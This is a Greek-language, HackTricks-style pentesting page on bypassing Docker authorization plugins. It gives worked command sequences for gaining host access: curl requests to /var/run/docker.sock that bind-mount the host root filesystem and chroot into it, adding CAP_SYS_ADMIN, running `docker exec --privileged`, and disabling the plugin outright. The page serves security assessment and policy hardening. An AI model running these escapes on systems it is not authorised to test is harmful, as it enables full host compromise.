# Plugins Εξουσιοδότησης Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα plugins εξουσιοδότησης Runtime αποτελούν ένα επιπλέον επίπεδο policy που αποφασίζει αν ένας caller επιτρέπεται να εκτελέσει μια συγκεκριμένη ενέργεια του daemon. Το Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, όποιος μπορεί να επικοινωνήσει με το Docker daemon έχει ουσιαστικά ευρύ έλεγχο πάνω του. Τα authorization plugins προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον authenticated user και την αιτούμενη API operation και στη συνέχεια επιτρέποντας ή απορρίπτοντας το request σύμφωνα με την policy.

Αυτό το θέμα αξίζει τη δική του σελίδα, επειδή αλλάζει το exploitation model όταν ένας attacker έχει ήδη πρόσβαση σε ένα Docker API ή σε έναν user της ομάδας `docker`. Σε τέτοια περιβάλλοντα, το ερώτημα δεν είναι πλέον μόνο «μπορώ να φτάσω στο daemon;», αλλά και «προστατεύεται το daemon από authorization layer και, αν ναι, μπορεί αυτό το layer να παρακαμφθεί μέσω endpoints που δεν έχουν υποστεί σωστό χειρισμό, αδύναμου JSON parsing ή permissions για plugin management;»

## Λειτουργία

Όταν ένα request φτάνει στο Docker daemon, το authorization subsystem μπορεί να προωθήσει το request context σε ένα ή περισσότερα εγκατεστημένα plugins. Το plugin βλέπει την authenticated user identity, τα request details, επιλεγμένα headers και τμήματα του request ή response body όταν το content type είναι κατάλληλο. Μπορούν να συνδεθούν πολλαπλά plugins σε chain και η πρόσβαση παρέχεται μόνο αν όλα τα plugins επιτρέψουν το request.

Αυτό το μοντέλο φαίνεται ισχυρό, αλλά η ασφάλειά του εξαρτάται πλήρως από το πόσο ολοκληρωμένα έχει κατανοήσει ο policy author το API. Ένα plugin που αποκλείει το `docker run --privileged` αλλά αγνοεί το `docker exec`, παραλείπει εναλλακτικά JSON keys όπως το top-level `Binds` ή επιτρέπει plugin administration μπορεί να δημιουργήσει μια ψευδή αίσθηση περιορισμού, ενώ εξακολουθεί να αφήνει ανοιχτά άμεσα privilege-escalation paths.

## Συνήθεις Στόχοι Plugins

Σημαντικές περιοχές για policy review είναι:

- endpoints δημιουργίας containers
- πεδία του `HostConfig`, όπως τα `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` και οι επιλογές namespace-sharing
- συμπεριφορά του `docker exec`
- endpoints διαχείρισης plugins
- οποιοδήποτε endpoint μπορεί έμμεσα να ενεργοποιήσει runtime actions εκτός του προβλεπόμενου policy model

Ιστορικά, παραδείγματα όπως το `authz` plugin της Twistlock και απλά εκπαιδευτικά plugins όπως το `authobot` έκαναν αυτό το μοντέλο εύκολο στη μελέτη, επειδή τα policy files και τα code paths τους έδειχναν πώς υλοποιούνταν στην πράξη το endpoint-to-action mapping. Για τις ανάγκες του assessment, το σημαντικό μάθημα είναι ότι ο policy author πρέπει να κατανοεί ολόκληρο το API surface και όχι μόνο τις πιο εμφανείς CLI commands.

## Κατάχρηση

Ο πρώτος στόχος είναι να μάθουμε τι πραγματικά αποκλείεται. Αν το daemon απορρίψει μια ενέργεια, το error συχνά κάνει leak το όνομα του plugin, γεγονός που βοηθά στον εντοπισμό του control που χρησιμοποιείται:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Αν χρειάζεστε ευρύτερο endpoint profiling, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα, επειδή αυτοματοποιούν τη διαφορετικά επαναλαμβανόμενη διαδικασία ελέγχου των API routes και των JSON structures που επιτρέπονται πραγματικά από το plugin.

Αν το περιβάλλον χρησιμοποιεί custom plugin και μπορείτε να αλληλεπιδράσετε με το API, απαριθμήστε ποια object fields φιλτράρονται πραγματικά:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Αυτοί οι έλεγχοι είναι σημαντικοί, επειδή πολλές αστοχίες εξουσιοδότησης αφορούν συγκεκριμένα πεδία και όχι συγκεκριμένες έννοιες. Ένα plugin μπορεί να απορρίψει ένα μοτίβο CLI χωρίς να αποκλείσει πλήρως την αντίστοιχη δομή API.

### Πλήρες παράδειγμα: Το `docker exec` προσθέτει προνόμια μετά τη δημιουργία του container

Μια policy που αποκλείει τη δημιουργία privileged container, αλλά επιτρέπει τη δημιουργία unconfined container μαζί με `docker exec`, μπορεί να παρακαμφθεί:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Αν ο daemon αποδεχτεί το δεύτερο βήμα, ο χρήστης έχει ανακτήσει μια privileged interactive διεργασία μέσα σε ένα container που ο συντάκτης της policy πίστευε ότι ήταν περιορισμένο.

### Πλήρες Παράδειγμα: Bind Mount μέσω Raw API

Ορισμένες ελαττωματικές policies ελέγχουν μόνο ένα JSON shape. Αν το bind mount του root filesystem δεν αποκλείεται με συνέπεια, το host μπορεί ακόμη να γίνει mount:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Η ίδια ιδέα μπορεί επίσης να εμφανίζεται στο `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Το impact είναι ένα πλήρες filesystem escape από το host. Η ενδιαφέρουσα λεπτομέρεια είναι ότι το bypass προέρχεται από ελλιπή κάλυψη της policy και όχι από bug στον kernel.

### Πλήρες Παράδειγμα: Unchecked Capability Attribute

Αν η policy ξεχάσει να φιλτράρει ένα attribute που σχετίζεται με capability, ο attacker μπορεί να δημιουργήσει ένα container που ανακτά μια επικίνδυνη capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Μόλις υπάρχει το `CAP_SYS_ADMIN` ή κάποια αντίστοιχα ισχυρή capability, πολλές τεχνικές breakout που περιγράφονται στο [capabilities.md](protections/capabilities.md) και στο [privileged-containers.md](privileged-containers.md) γίνονται προσβάσιμες.

### Πλήρες Παράδειγμα: Απενεργοποίηση του Plugin

Εάν επιτρέπονται οι λειτουργίες plugin-management, το καθαρότερο bypass μπορεί να είναι η πλήρης απενεργοποίηση του ελέγχου:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Πρόκειται για αποτυχία policy σε επίπεδο control-plane. Το authorization layer υπάρχει, αλλά ο χρήστης που υποτίθεται ότι θα περιόριζε εξακολουθεί να έχει permission να το απενεργοποιήσει.

## Έλεγχοι

Αυτές οι εντολές αποσκοπούν στον εντοπισμό του αν υπάρχει policy layer και του αν φαίνεται να είναι πλήρες ή επιφανειακό.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Μηνύματα άρνησης που περιλαμβάνουν όνομα plugin επιβεβαιώνουν την ύπαρξη authorization layer και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
- Μια λίστα plugin που είναι ορατή στον attacker μπορεί να αρκεί για να διαπιστωθεί αν είναι δυνατές λειτουργίες disable ή reconfigure.
- Μια policy που μπλοκάρει μόνο προφανείς ενέργειες CLI, αλλά όχι raw API requests, πρέπει να θεωρείται bypassable μέχρι να αποδειχθεί το αντίθετο.

## Προεπιλογές Runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Δεν είναι ενεργοποιημένο από προεπιλογή | Η πρόσβαση στον daemon είναι ουσιαστικά all-or-nothing, εκτός αν έχει ρυθμιστεί authorization plugin | ελλιπής plugin policy, blacklists αντί για allowlists, δυνατότητα διαχείρισης plugin, blind spots σε επίπεδο πεδίων |
| Podman | Δεν υπάρχει συνηθισμένο άμεσο ισοδύναμο | Το Podman βασίζεται συνήθως περισσότερο σε Unix permissions, rootless execution και αποφάσεις σχετικά με την έκθεση API, παρά σε authz plugin τύπου Docker | ευρεία έκθεση ενός rootful Podman API, αδύναμα socket permissions |
| containerd / CRI-O | Διαφορετικό control model | Αυτά τα runtime βασίζονται συνήθως σε socket permissions, node trust boundaries και controls υψηλότερου επιπέδου από τον orchestrator, αντί για Docker authz plugins | mount του socket σε workloads, αδύναμες node-local trust assumptions |
| Kubernetes | Χρησιμοποιεί authn/authz στα επίπεδα του API-server και του kubelet, όχι Docker authz plugins | Το Cluster RBAC και τα admission controls αποτελούν το κύριο policy layer | υπερβολικά ευρύ RBAC, αδύναμη admission policy, άμεση έκθεση των kubelet ή runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
